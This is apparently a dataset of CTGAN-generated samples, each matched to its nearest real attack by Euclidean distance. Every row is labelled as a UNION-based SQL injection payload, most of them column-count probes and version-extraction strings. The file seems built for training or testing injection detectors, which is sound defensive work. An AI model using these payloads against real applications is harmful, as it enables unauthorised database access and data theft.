id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000980,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,5.635993308113445
CTGAN_000981,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,5.40516633408779
CTGAN_000982,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,4.479749231275994
CTGAN_000983,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,4.783096598472822
CTGAN_000984,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,6.719738754934169
CTGAN_000985,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.681638659215518
CTGAN_000986,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000145,5.903012793403856
CTGAN_000987,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,4.190762238397798
CTGAN_000988,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,5.970018043397257
CTGAN_000989,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.756653202943243
CTGAN_000990,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000145,10.54533914863552
CTGAN_000991,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000124,4.7506220477777505
CTGAN_000992,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,7.051086988250959
CTGAN_000993,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,5.419858152566716
CTGAN_000994,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,5.792495631782104
CTGAN_000995,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,8.548108998445759
CTGAN_000996,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.291631751224252
CTGAN_000997,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,5.588723482373445
CTGAN_000998,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,6.67121371794226
CTGAN_000999,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,6.68947861886328
CTGAN_001000,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,5.391148442109934
CTGAN_001001,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.290231409080213
CTGAN_001002,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,7.791529957322806
CTGAN_001003,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,5.954094436461195
CTGAN_001004,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,5.57621161846763
CTGAN_001005,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,10.220703955828586
CTGAN_001006,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.740508427611013
CTGAN_001007,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,5.782539259666473
CTGAN_001008,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,6.074746283281338
CTGAN_001009,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,6.796144648289587
CTGAN_001010,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,7.071118067646656
CTGAN_001011,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.119808444527726
CTGAN_001012,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000121,6.380096893944205
CTGAN_001013,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,7.0251816048945095
CTGAN_001014,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,7.448102786735257
CTGAN_001015,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000059,8.518419028582795
CTGAN_001016,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,6.828653154727489
CTGAN_001017,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,5.115381622250595
CTGAN_001018,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.696058504201846
CTGAN_001019,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,9.086813925929867
CTGAN_001020,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,7.490947949999969
CTGAN_001021,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,5.811303430233009
CTGAN_001022,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,4.371932161082235
CTGAN_001023,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,6.174948209023224
CTGAN_001024,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,6.453624079387875
CTGAN_001025,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000050,5.18625809566736
CTGAN_001026,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000059,5.214299767244596
CTGAN_001027,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,6.06598299704336
CTGAN_001028,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000085,6.876810425060815
CTGAN_001029,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000121,6.23059845622164
CTGAN_001030,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,4.97708986201007
CTGAN_001031,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,6.563766028947831
CTGAN_001032,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.338977335482753
CTGAN_001033,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,6.911595979128028
CTGAN_001034,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,5.812938937471247
CTGAN_001035,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,6.275911988405086
CTGAN_001036,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,6.642397457217612
CTGAN_001037,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,5.823464947705003
CTGAN_001038,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.118982198733574
CTGAN_001039,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,5.824136674471151
CTGAN_001040,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,6.9375547339282235
CTGAN_001041,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000124,5.892566196245815
CTGAN_001042,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,5.102404213692472
CTGAN_001043,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,5.0700030406983805
CTGAN_001044,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000075,6.383056715937
CTGAN_001045,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000147,6.262335990379013
CTGAN_001046,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,5.403501672970726
CTGAN_001047,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.361432602180119
CTGAN_001048,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,6.9794836110058185
CTGAN_001049,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,7.352116969839508
CTGAN_001050,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,5.708404240678832
CTGAN_001051,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,6.459715057162281
CTGAN_001052,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,5.674007434167442
CTGAN_001053,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,7.507052868195796
CTGAN_001054,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.1722005133788205
CTGAN_001055,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000122,7.048752241647022
CTGAN_001056,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,7.002208228636469
CTGAN_001057,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.659761666896085
CTGAN_001058,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.200000851195329
CTGAN_001059,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.145069011104093
CTGAN_001060,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,6.0770656589584995
CTGAN_001061,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.056354134797599
CTGAN_001062,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,5.097367284878184
CTGAN_001063,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,9.226803608066326
CTGAN_001064,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,8.107578929594112
CTGAN_001065,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.480868586766826
CTGAN_001066,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.928308962620605
CTGAN_001067,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.144442885468903
CTGAN_001068,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,8.115648374976788
CTGAN_001069,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,6.180292797537843
CTGAN_001070,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,5.575662764647061
CTGAN_001071,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000005,8.689357320538925
CTGAN_001072,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,6.707661598739108
CTGAN_001073,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,4.930944242126052
CTGAN_001074,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000150,5.3514253431332
CTGAN_001075,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.820439583745607
CTGAN_001076,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,4.782827602209767
CTGAN_001077,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,5.36132473983203
CTGAN_001078,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,6.596392879035886
CTGAN_001079,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.415964546498439
CTGAN_001080,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,6.98612919907151
CTGAN_001081,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.950249948596454
CTGAN_001082,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.318909803886166
CTGAN_001083,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,5.620169952651046
CTGAN_001084,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,5.125755725976884
CTGAN_001085,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,5.143793940537898
CTGAN_001086,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,8.178386793333923
CTGAN_001087,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.3881608911438885
CTGAN_001088,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,6.478007144304832
CTGAN_001089,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.316031847257044
CTGAN_001090,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,7.37994269840832
CTGAN_001091,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,8.796861211862756
CTGAN_001092,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000099,5.330143668415196
CTGAN_001093,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,8.1050390643765
CTGAN_001094,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,5.789015497377052
CTGAN_001095,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,5.61537101331722
CTGAN_001096,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000075,5.3925387237284035
CTGAN_001097,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,4.963412417753572
CTGAN_001098,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,4.902496009717338
CTGAN_001099,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,5.699329199204975
CTGAN_001100,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,8.789554767222858
CTGAN_001101,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,3.289459200171545
CTGAN_001102,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,5.9456753518857415
CTGAN_001103,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,5.461228740332277
CTGAN_001104,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.584231434638391
CTGAN_001105,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,8.663379477605408
CTGAN_001106,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.541624349972276
CTGAN_001107,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,6.21779050432565
CTGAN_001108,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,6.645820726596594
CTGAN_001109,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,7.746371306449749
CTGAN_001110,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,4.436372990579934
CTGAN_001111,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,3.6890782723149886
CTGAN_001112,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,7.451321167164909
CTGAN_001113,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,3.661790254656057
CTGAN_001114,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,3.7992907338787854
CTGAN_001115,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,5.981734945710849
CTGAN_001116,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,6.367219656775761
CTGAN_001117,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,6.512257575858382
CTGAN_001118,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.247714679005023
CTGAN_001119,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.355799952211234
CTGAN_001120,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,10.713867762304357
CTGAN_001121,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.369008410708436
CTGAN_001122,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,6.672582436249923
CTGAN_001123,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,6.010297454652427
CTGAN_001124,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000148,5.979847117196829
CTGAN_001125,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.135883713314012
CTGAN_001126,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,5.475302723372803
CTGAN_001127,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,4.380049337873569
CTGAN_001128,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.592559062195826
CTGAN_001129,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,6.4547280844815855
CTGAN_001130,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,6.45107639778858
CTGAN_001131,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,4.151028401383174
CTGAN_001132,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,6.747135345512615
CTGAN_001133,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,6.11685721064907
CTGAN_001134,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,4.794585443851901
CTGAN_001135,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,5.79580698570286
CTGAN_001136,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,5.050883295153274
CTGAN_001137,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,7.579627680690208
CTGAN_001138,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,4.590536713490434
CTGAN_001139,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,6.364055998108232
CTGAN_001140,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,3.8532309716517337
CTGAN_001141,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,6.37803429442882
CTGAN_001142,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.775572822041883
CTGAN_001143,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,6.724376938526241
CTGAN_001144,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.818200277475338
CTGAN_001145,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,6.009781586417132
CTGAN_001146,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,4.519301786339207
CTGAN_001147,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,6.895122804301386
CTGAN_001148,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,7.023830391787057
CTGAN_001149,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,6.307333195843471
CTGAN_001150,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,7.219609703635325
CTGAN_001151,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,4.940848796680783
CTGAN_001152,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,4.299382020068073
CTGAN_001153,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,5.302663619921805
CTGAN_001154,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.592930543761075
CTGAN_001155,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,6.344950562268965
CTGAN_001156,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,6.089997246448964
CTGAN_001157,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,8.128198345389348
CTGAN_001158,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,6.425537415928778
CTGAN_001159,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,5.814923006200868
CTGAN_001160,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,6.842325224144383
CTGAN_001161,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,5.545870644769973
CTGAN_001162,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,4.863734136479167
CTGAN_001163,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,4.650681809928616
CTGAN_001164,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,4.632019936405517
CTGAN_001165,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000115,8.614233403354774
CTGAN_001166,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,5.2250979902359775
CTGAN_001167,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,5.772236455238606
CTGAN_001168,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,4.506058776610638
CTGAN_001169,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.4153099931123565
CTGAN_001170,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,5.421580151715779
CTGAN_001171,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,5.568815911349221
CTGAN_001172,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,6.716279944089675
CTGAN_001173,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.103558848555364
CTGAN_001174,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,7.628021690986951
CTGAN_001175,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,5.480028224182744
